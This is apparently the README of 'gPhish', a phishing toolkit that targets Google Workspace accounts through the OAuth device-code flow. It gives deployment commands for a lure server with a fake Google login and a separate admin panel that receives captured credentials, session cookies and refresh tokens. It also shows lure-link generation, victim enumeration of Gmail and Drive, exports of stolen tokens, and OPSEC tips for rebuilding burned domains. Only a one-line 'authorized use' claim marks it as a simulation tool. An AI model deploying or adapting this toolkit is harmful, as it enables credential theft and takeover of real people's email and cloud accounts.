# gPhish — Google Workspace Device-Code Phishing Toolkit
For AUTHORIZED phishing simulations only (signed RoE required).

## Architecture — two separate servers/domains

┌──────────────────────────┐         ┌─────────────────────────────┐
│  LURE SERVER             │  push   │  ADMIN PANEL                │
│  lure_server.py          │────────▶│  app.py                     │
│  login.yourlure1.com     │ ingest  │  panel-yours.ngrok/own dom  │
│  Victims reach this.     │  API    │  ONLY YOU reach this.       │
│  Burns? Rebuild, lost    │         │  Tokens, creds, exports,    │
│  nothing but the domain. │         │  scheduler, blast engine.   │
└──────────────────────────┘         └─────────────────────────────┘
Both domains MUST be different. The panel URL never appears in anything
a victim receives.

Victim flow:
1. Panel launches campaign (device code via Google) + email w/ code
2. Email lures victim to LURE DOMAIN /l/<id> (fake Google login)
3. Victim "logs in" → creds+cookies captured on lure server →
   pushed to panel in real time; page shows "wrong password"
4. Victim redirected to google.com/device → enters code → consents
5. Panel captures refresh token → enumerates Gmail/Drive/identity

## Files
| File | Purpose |
|---|---|
| app.py | Admin panel (dashboard, campaigns, victims, creds, mailing, scheduler, exports, /lure-ingest) |
| lure_server.py | Standalone victim-facing fake login (separate deployment) |
| gphish.py | CLI version (headless run/enum) |
| DEPLOY.md | Domain/DNS/nginx/Cloudflare setup guide |
| requirements.txt | flask, requests, cryptography |

## Quick start — panel
    pip install -r requirements.txt
    GPANEL_USER=op1 GPANEL_PASS='S3cure!' \
    LURE_INGEST_KEY='shared-long-secret' \
    GPANEL_HTTP=1 python3 app.py
Browse the panel URL → Settings → set panel_domain + lure_domain.

## Quick start — lure server (different machine/domain!)
    LURE_KEY='lure-admin-key' \
    PANEL_URL='https://panel-url' PANEL_KEY='shared-long-secret' \
    LURE_PORT=8080 python3 lure_server.py
Behind nginx + Let's Encrypt or Cloudflare Tunnel (see DEPLOY.md).

Generate a lure link:
    curl "https://login.yourlure1.com/new?key=lure-admin-key"
    → {"lure_url": "https://login.yourlure1.com/l/a1b2c3", "id": "a1b2c3"}

## Exports (Dashboard)
JSON full report · CSV victims · CSV creds (incl. refresh tokens) ·
Cookies .txt · Cookies .json (name/value pairs, ready for tooling)

## Critical dependency
A device-flow OAuth Client ID: Google Cloud Console → OAuth consent
screen (External) → Credentials → "TVs and Limited Input devices".
No valid client ID = no device codes.

## OPSEC / rules
- Never reuse the lure domain as the panel domain (dashboard warns).
- All captures stored PLAINTEXT in panel_data.json / lure_data.json —
  wipe both + exports at engagement end; issue data-destruction cert.
- /login fallback on the panel is OFF by default — enable only for lab tests.
- SMTP: SPF/DKIM/DMARC on the mail domain; Gmail caps ~500/day.
